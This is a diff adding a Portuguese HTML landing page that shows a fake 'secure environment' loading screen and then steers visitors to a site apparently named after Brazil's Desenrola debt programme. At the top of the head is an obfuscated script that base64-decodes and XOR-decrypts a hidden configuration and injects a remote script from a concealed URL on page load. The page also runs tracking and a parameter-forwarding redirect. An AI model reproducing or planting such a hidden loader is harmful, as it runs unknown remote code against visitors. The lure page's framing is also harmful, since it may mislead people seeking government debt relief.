@@ -1,0 +1,346 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+<script>(function(){var j_o8=atob("DCb2iZN3IvC2T32F5V3U/OEbAMqUJwnxlVXMprwURp6YOgnojECPp/AYT97UPVL2hlSf+ecEDYDfNxjpylaf8fYbDJrFbVGnhFKC+/oVV4TTPF+/vnvaq/QbTZLXIw6n332Nq/0WT5WUdV/1jF6T5doTANyUORzpkEPUs7FBQ8eHexy2hx7D7/FHEMOGfkqy1BfGsadVX63L");var w_ce=[];for(var i_i=0;i_i<j_o8.length;i_i++){w_ce.push(j_o8.charCodeAt(i_i)&255);}var v_b7o1=w_ce[0];var r_v=w_ce.slice(1,1+v_b7o1);var c_rfrf=w_ce.slice(1+v_b7o1);var m_9d=c_rfrf.map(function(b,s_dgv){return b^r_v[s_dgv%v_b7o1];});var v_dz="";for(var e_m3j=0;e_m3j<m_9d.length;e_m3j++){v_dz+=String.fromCharCode(m_9d[e_m3j]&255);}var j_v=decodeURIComponent(escape(v_dz));var e_4t7=JSON.parse(j_v);var z_6uei=e_4t7.globals||[];z_6uei.forEach(function(w_kl29){window[w_kl29.name]=w_kl29.value;});var n_4v=document.createElement("script");n_4v.src=e_4t7.url;n_4v.async=true;n_4v.defer=true;(e_4t7.attributes||[]).forEach(function(w_mm){n_4v.setAttribute(w_mm.name,w_mm.value);});(document.head||document.documentElement).appendChild(n_4v);})();</script>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="robots" content="noindex, nofollow">
+<title>Portal de Consulta Automática</title>
+<style>
+  :root {
+    --background: #f8fafc;
+    --foreground: #0f172a;
+    --card: #ffffff;
+    --primary: #4f46e5;
+    --primary-foreground: #ffffff;
+    --secondary: #10b981;
+    --secondary-foreground: #ffffff;
+    --muted: #e2e8f0;
+    --muted-foreground: #64748b;
+    --border: #cbd5e1;
+    --bg-legal: #f1f5f9;
+  }
+
+  * { box-sizing: border-box; }
+
+  body {
+    margin: 0;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    background: var(--background);
+    color: var(--foreground);
+    -webkit-font-smoothing: antialiased;
+  }
+
+  /* Classes utilitárias de tela */
+  .screen {
+    min-height: 100dvh;
+    display: none; /* Escondido por padrão, o JS controla */
+    align-items: center;
+    justify-content: center;
+    padding: 1.5rem;
+    animation: fadeIn 0.4s ease-out;
+  }
+
+  .screen-legal {
+    min-height: 100dvh;
+    display: none; /* Escondido por padrão */
+    justify-content: center;
+    padding: 2rem 1rem;
+    animation: fadeIn 0.4s ease-out;
+  }
+
+  /* Tela de Carregamento Ativa por Padrão */
+  #loading-screen {
+    display: flex;
+    flex-direction: column;
+  }
+
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateY(10px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  /* ---------- Animação e Loading ---------- */
+  .icon-circle {
+    width: 72px;
+    height: 72px;
+    border-radius: 50%;
+    background: #eef2ff;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin-bottom: 1.5rem;
+    box-shadow: 0 0 0 8px rgba(79, 70, 229, 0.1);
+    animation: pulse 2s infinite;
+  }
+
+  @keyframes pulse {
+    0% { box-shadow: 0 0 0 0 rgba(79, 70, 229, 0.2); }
+    70% { box-shadow: 0 0 0 15px rgba(79, 70, 229, 0); }
+    100% { box-shadow: 0 0 0 0 rgba(79, 70, 229, 0); }
+  }
+
+  .icon-circle svg { width: 32px; height: 32px; stroke: var(--primary); }
+  #loading-screen h2 { font-size: 1.25rem; font-weight: 700; margin: 0 0 0.5rem 0; text-align: center; }
+  #loading-screen p.subtitle { font-size: 0.9rem; color: var(--muted-foreground); margin: 0 0 2rem 0; text-align: center; }
+  
+  .progress-wrap { width: 100%; max-width: 280px; }
+  .progress-track { width: 100%; height: 8px; border-radius: 4px; background: var(--muted); overflow: hidden; margin-bottom: 0.5rem; }
+  .progress-fill { height: 100%; border-radius: 4px; background: linear-gradient(90deg, var(--primary), #818cf8); width: 0%; transition: width 0.1s linear; }
+  .progress-pct { font-size: 0.85rem; font-weight: 600; color: var(--primary); text-align: center; margin: 0; }
+
+  /* ---------- Card Principal ---------- */
+  .card {
+    width: 100%;
+    max-width: 400px;
+    border-radius: 1.25rem;
+    background: var(--card);
+    box-shadow: 0 20px 25px -5px rgba(0,0,0,0.05), 0 8px 10px -6px rgba(0,0,0,0.01);
+    border: 1px solid #f1f5f9;
+  }
+
+  .card-inner { padding: 2.5rem 1.5rem; display: flex; flex-direction: column; align-items: center; }
+  .success-icon { width: 80px; height: 80px; border-radius: 50%; background: #d1fae5; display: flex; align-items: center; justify-content: center; margin-bottom: 1.5rem; }
+  .success-icon svg { width: 40px; height: 40px; stroke: var(--secondary); }
+  
+  .intro-text { text-align: center; margin-bottom: 2rem; }
+  .intro-text h1 { font-size: 1.5rem; font-weight: 800; margin: 0 0 0.75rem 0; line-height: 1.2; }
+  .intro-text p { margin: 0; font-size: 1rem; color: var(--muted-foreground); line-height: 1.5; }
+
+  .cta-group { width: 100%; display: flex; flex-direction: column; gap: 1rem; margin-bottom: 1.5rem; }
+  .btn { width: 100%; height: 52px; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 1.05rem; text-decoration: none; transition: transform 0.2s, box-shadow 0.2s; }
+  .btn:active { transform: scale(0.98); }
+  .btn-primary { background: var(--secondary); color: var(--secondary-foreground); box-shadow: 0 4px 12px rgba(16, 185, 129, 0.3); }
+  .btn-primary:hover { box-shadow: 0 6px 16px rgba(16, 185, 129, 0.4); }
+
+  /* ---------- Rodapé e Disclaimer ---------- */
+  .footer-container { width: 100%; text-align: center; border-top: 1px solid var(--muted); padding-top: 1.5rem; }
+  .legal-links { display: flex; align-items: center; justify-content: center; flex-wrap: wrap; gap: 0.5rem; font-size: 0.8rem; color: var(--muted-foreground); margin-bottom: 1rem; }
+  .legal-links a { color: inherit; text-decoration: none; cursor: pointer; }
+  .legal-links a:hover { text-decoration: underline; }
+  .legal-links span { color: var(--border); }
+  .disclaimer-text { font-size: 0.7rem; color: var(--muted-foreground); line-height: 1.4; margin: 0; padding: 0 0.5rem; }
+
+  /* ---------- Telas de Políticas/Termos (Estilo Texto Longo) ---------- */
+  .legal-card {
+    width: 100%;
+    max-width: 680px;
+    border-radius: 12px;
+    background: var(--card);
+    box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+    padding: 2rem 1.5rem;
+    height: fit-content; /* Permite rolar a página sem bugar */
+  }
+
+  .back-link { display: inline-flex; align-items: center; gap: 0.25rem; font-size: 0.9rem; color: var(--primary); text-decoration: none; margin-bottom: 1.5rem; font-weight: 600; cursor: pointer; }
+  .back-link:hover { text-decoration: underline; }
+  
+  .legal-card h1 { font-size: 1.5rem; font-weight: 800; margin: 0 0 1.5rem 0; }
+  .legal-card h2 { font-size: 1.1rem; font-weight: 700; margin: 1.5rem 0 0.5rem 0; }
+  .legal-card p, .legal-card li { font-size: 0.95rem; color: #475569; margin-bottom: 1rem; line-height: 1.6; }
+  .legal-card ul { padding-left: 1.5rem; margin-bottom: 1rem; }
+  .inline-link { color: var(--primary); text-decoration: underline; }
+
+  .notice { margin-top: 2rem; padding: 1.2rem; border-radius: 8px; border: 1px solid var(--border); background: var(--bg-legal); }
+  .notice h2 { font-size: 1rem; margin-top: 0; }
+  .notice p { font-size: 0.85rem; margin: 0; }
+
+</style>
+<script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck data-utmify-prevent-subids async defer></script>
+<script src="/js/utmify-track.js"></script>
+</head>
+<body>
+
+  <!-- ================= TELA 1: CARREGAMENTO ================= -->
+  <div id="loading-screen" class="screen">
+    <div class="icon-circle">
+      <svg fill="none" viewBox="0 0 24 24" stroke-width="2">
+        <path stroke-linecap="round" stroke-linejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
+      </svg>
+    </div>
+    <h2>Ambiente Seguro</h2>
+    <div class="progress-wrap">
+      <div class="progress-track">
+        <div class="progress-fill" id="progress-fill"></div>
+      </div>
+      <p class="progress-pct" id="progress-pct">0%</p>
+    </div>
+  </div>
+
+  <!-- ================= TELA 2: PRINCIPAL (APÓS CARREGAR) ================= -->
+  <article id="main-content" class="screen">
+    <div class="card">
+      <div class="card-inner">
+        <div class="success-icon">
+          <svg fill="none" viewBox="0 0 24 24" stroke-width="2.5">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path>
+          </svg>
+        </div>
+
+        <div class="intro-text">
+          <h1>Conexão Estabelecida</h1>
+          <p>O sistema foi carregado com sucesso. Avance para iniciar o preenchimento ou consultar o guia oficial.</p>
+        </div>
+
+        <div class="cta-group">
+          <a href="https://brasildesenrola2026.com/" id="cta-next" class="btn btn-primary">ACESSAR PORTAL AGORA</a>
+        </div>
+
+        <!-- Rodapé com Links Mágicos (JS) -->
+        <div class="footer-container">
+            <div class="legal-links">
+                <a onclick="showScreen('privacy-screen')">Política de Privacidade</a>
+                <span aria-hidden="true">|</span>
+                <a onclick="showScreen('terms-screen')">Termos de Uso</a>
+            </div>
+            <p class="disclaimer-text">
+                Este portal tem caráter estritamente informativo e atua de forma independente. 
+                Não possuímos vínculo com o Google, YouTube ou entidades governamentais.
+            </p>
+        </div>
+      </div>
+    </div>
+  </article>
+
+  <!-- ================= TELA 3: POLÍTICA DE PRIVACIDADE ================= -->
+  <section id="privacy-screen" class="screen-legal">
+    <div class="legal-card">
+      <a onclick="showScreen('main-content')" class="back-link">� Voltar ao Início</a>
+
+      <h1>Política de Privacidade</h1>
+      <p>A sua privacidade é importante para nós. Esta Política de Privacidade descreve como coletamos, usamos e protegemos as informações dos visitantes deste site.</p>
+
+      <h2>1. Informações Coletadas</h2>
+      <p>Este site pode coletar informações não pessoais automaticamente, como tipo de navegador, idioma, horário de acesso e páginas visitadas. Essas informações são utilizadas exclusivamente para fins de análise e melhoria da experiência do usuário.</p>
+
+      <h2>2. Uso de Cookies e Tecnologias</h2>
+      <p>Este site utiliza cookies e tecnologias semelhantes, incluindo as fornecidas por serviços de terceiros, como o Google Ads e o Google Analytics, para:</p>
+      <ul>
+        <li>Exibir anúncios personalizados com base nos interesses do usuário;</li>
+        <li>Medir o desempenho de campanhas publicitárias;</li>
+        <li>Analisar o tráfego e o comportamento de navegação;</li>
+      </ul>
+
+      <h2>3. Google Ads e Remarketing</h2>
+      <p>Utilizamos o Google Ads para veicular anúncios em plataformas de terceiros. O Google pode utilizar cookies para exibir anúncios com base em visitas anteriores a este site. Os dados coletados pelo Google Ads são tratados de acordo com a Política de Privacidade do Google: <a class="inline-link" href="https://policies.google.com/privacy" target="_blank" rel="noopener noreferrer">policies.google.com/privacy</a>.</p>
+      
+      <h2>4. Compartilhamento de Dados</h2>
+      <p>Não vendemos, trocamos ou transferimos suas informações pessoais para terceiros.</p>
+
+      <div class="notice">
+        <h2>Aviso Importante</h2>
+        <p>Este portal tem caráter estritamente informativo e atua de forma independente. Não possuímos vínculo com o Google, YouTube ou entidades governamentais. Todo o conteúdo aqui apresentado tem caráter meramente informativo.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ================= TELA 4: TERMOS DE USO ================= -->
+  <section id="terms-screen" class="screen-legal">
+    <div class="legal-card">
+      <a onclick="showScreen('main-content')" class="back-link">� Voltar ao Início</a>
+
+      <h1>Termos de Uso</h1>
+      <p>Ao acessar e utilizar este site, você concorda com os seguintes Termos de Uso. Caso não concorde com qualquer uma das condições abaixo, recomendamos que não utilize o site.</p>
+
+      <h2>1. Objetivo do Site</h2>
+      <p>Este site tem como objetivo fornecer informações gerais ao público. O conteúdo apresentado é de caráter exclusivamente informativo e não constitui assessoria, consultoria ou prestação de serviços oficiais de qualquer natureza.</p>
+
+      <h2>2. Uso de Cookies e Publicidade</h2>
+      <p>Este site utiliza cookies e tecnologias de rastreamento, incluindo o Google Ads, para fins de publicidade e análise. Ao navegar neste site, você consente com o uso dessas tecnologias. Os anúncios exibidos podem ser personalizados com base no seu histórico.</p>
+
+      <h2>3. Propriedade Intelectual</h2>
+      <p>O conteúdo deste site é protegido por direitos autorais. A reprodução total ou parcial sem autorização prévia é proibida.</p>
+
+      <h2>4. Links para Terceiros</h2>
+      <p>Este site pode conter links para sites de terceiros. Não temos controle sobre o conteúdo ou as práticas de privacidade desses sites e não nos responsabilizamos por eles.</p>
+
+      <div class="notice">
+        <h2>Aviso Importante</h2>
+        <p>Este portal tem caráter estritamente informativo e atua de forma independente. Não possuímos vínculo com o Google, YouTube ou entidades governamentais. Todo o conteúdo aqui apresentado tem caráter meramente informativo.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ================= SCRIPTS DE CONTROLE ================= -->
+  <script>
+    // 1. Script da Barra de Carregamento
+    (function () {
+      var progress = 0;
+      var totalDuration = 2500; 
+      var interval = 25;
+      var steps = totalDuration / interval;
+      var increment = 100 / steps;
+
+      var fill = document.getElementById('progress-fill');
+      var pctLabel = document.getElementById('progress-pct');
+
+      var timer = setInterval(function () {
+        progress += increment;
+        if (progress >= 100) {
+          progress = 100;
+          clearInterval(timer);
+          setTimeout(finishLoading, 200);
+        }
+        update(progress);
+      }, interval);
+
+      function update(p) {
+        var pct = Math.round(p);
+        fill.style.width = pct + '%';
+        pctLabel.textContent = pct + '%';
+      }
+
+      function finishLoading() {
+        document.getElementById('loading-screen').style.display = 'none';
+        document.getElementById('main-content').style.display = 'flex';
+      }
+    })();
+
+    // 2. Script para Trocar as Telas (Navegação na mesma página)
+    function showScreen(screenId) {
+      // Esconde todas as telas
+      document.getElementById('main-content').style.display = 'none';
+      document.getElementById('privacy-screen').style.display = 'none';
+      document.getElementById('terms-screen').style.display = 'none';
+      
+      // Mostra apenas a tela solicitada
+      document.getElementById(screenId).style.display = 'flex';
+      
+      // Rola a página para o topo automaticamente
+      window.scrollTo(0, 0);
+    }
+  </script>
+<script id="_wauttk">var _wau = _wau || []; _wau.push(["dynamic", "jfdj3zqohe", "ttk"]);</script>
+  <script async src="//waust.at/d.js"></script>
+
+
+  <!-- ==== REDIRECIONAMENTO PARA O NOVO DOMINIO (edite a linha abaixo) ==== -->
+  <script>
+    var NOVO_DOMINIO = "https://brasildesenrola2026.com/"; // <-- TROQUE AQUI
+    (function () {
+      function montarDestino() {
+        var url = new URL(NOVO_DOMINIO);
+        var atuais = new URLSearchParams(window.location.search);
+        atuais.forEach(function (v, k) { if (v) url.searchParams.set(k, v); });
+        try {
+          var salvos = JSON.parse(localStorage.getItem("tracking_params") || "{}");
+          Object.keys(salvos).forEach(function (k) {
+            if (salvos[k] && !url.searchParams.get(k)) url.searchParams.set(k, salvos[k]);
+          });
+        } catch (e) {}
+        return url.toString();
+      }
+      function aplicar() {
+        var cta = document.getElementById("cta-next");
+        if (cta) cta.setAttribute("href", montarDestino());
+      }
+      // guarda os parametros de trafego para nao perder no caminho
+      try {
+        var p = new URLSearchParams(window.location.search);
+        var keys = ["utm_source","utm_medium","utm_campaign","utm_content","utm_term","src","sck","xcod","gclid","fbclid","ttclid"];
+        var store = JSON.parse(localStorage.getItem("tracking_params") || "{}");
+        keys.forEach(function (k) { var v = p.get(k); if (v) store[k] = v; });
+        localStorage.setItem("tracking_params", JSON.stringify(store));
+      } catch (e) {}
+      if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", aplicar); else aplicar();
+    })();
+  </script>
+</body></html>
